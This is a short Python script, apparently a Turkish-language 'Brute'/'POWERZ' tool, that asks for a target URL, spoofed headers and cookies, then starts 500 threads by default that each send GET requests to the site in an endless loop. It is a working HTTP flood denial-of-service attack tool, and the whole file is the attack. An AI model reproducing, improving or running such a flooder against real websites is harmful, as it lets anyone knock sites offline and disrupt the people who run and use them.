import requests
import threading
import time
import sys
from bs4 import BeautifulSoup
from pystyle import *
from os import system
from getpass import getpass as hinput
import os

text = r'''

   ▄███████▄  ▄██████▄   ▄█     █▄     ▄████████    ▄████████  ▄███████▄  
  ███    ███ ███    ███ ███     ███   ███    ███   ███    ███ ██▀     ▄██ 
  ███    ███ ███    ███ ███     ███   ███    █▀    ███    ███       ▄███▀ 
  ███    ███ ███    ███ ███     ███  ▄███▄▄▄      ▄███▄▄▄▄██▀  ▀█▀▄███▀▄▄ 
▀█████████▀  ███    ███ ███     ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀     ▄███▀   ▀ 
  ███        ███    ███ ███     ███   ███    █▄  ▀███████████ ▄███▀       
  ███        ███    ███ ███ ▄█▄ ███   ███    ███   ███    ███ ███▄     ▄█ 
 ▄████▀       ▀██████▀   ▀███▀███▀    ██████████   ███    ███  ▀████████▀ 
                                                   ███    ███             

'''.replace('▓', '▀')



banner = r""""""


banner = Add.Add(text, banner, center=True)

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))


def init():
    System.Size(100, 40)                                                                                                                                                                                                                                                                   ,System.Title(".B.r.u.t.e. .-. .b.y. .b.i.l.l.y.t.h.e.g.o.a.t.3.5.6.".replace('.',''))
    Cursor.HideCursor()
    system("title " + "BY P0WERZ")


init()

def stage(text, symbol = '...'):
    col1 = purple
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()

print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))

url = input(stage(f"Url giriniz {purple}->{fluo2} ", '?'))
threadsayi = input(stage(f"Threads {purple}[{white}ayarlanmış: {fluo2}500{white}{purple}] {purple}->{fluo2} ", '?'))
if threadsayi == '':
    threadsayi = 500
else:
    try:
        threads = int(threadsayi)
    except ValueError:
        error("Hata! Lütfen bir sayı giriniz.")
referer = input(stage(f"Referer {purple}[{white}{fluo2}HEADER{white} da bulabilirsiniz{purple}] {purple}->{fluo2} ", '?'))
useragent = input(stage(f"User-Agent {purple}[{white}{fluo2}HEADER{white} da bulabilirsiniz{purple}] {purple}->{fluo2} ", '?'))
cookie = input(stage(f"Cookie {purple}[{white}{fluo2}HEADER{white} da bulabilirsiniz{purple}] {purple}->{fluo2} ", '?'))
contenttype = input(stage(f"Content-Type {purple}[{white}{fluo2}HEADER{white} da bulabilirsiniz{purple}] {purple}->{fluo2} ", '?'))
accept = input(stage(f"Accept {purple}[{white}{fluo2}HEADER{white} da bulabilirsiniz{purple}] {purple}->{fluo2} ", '?'))

headers = {
    'referer':referer,
    'user-agent' : useragent,
    'accept' :accept,
    'content-type' :contenttype,
    'cookie' :cookie,
}

def attack():
    while True:
        try:
            s = requests.get(url,headers=headers)
            soup = BeautifulSoup(s.content,"html.parser")
            print(stage(f"Paket gönderildi! Site title: {fluo2}{soup.title.text}{white} {' '*20}"), end='\r')
        except:
            error("Siteye paket gönderilemedi!")

for i in range(int(threadsayi)):
    t = threading.Thread(target=attack)
    t.start()
    time.sleep(0.01)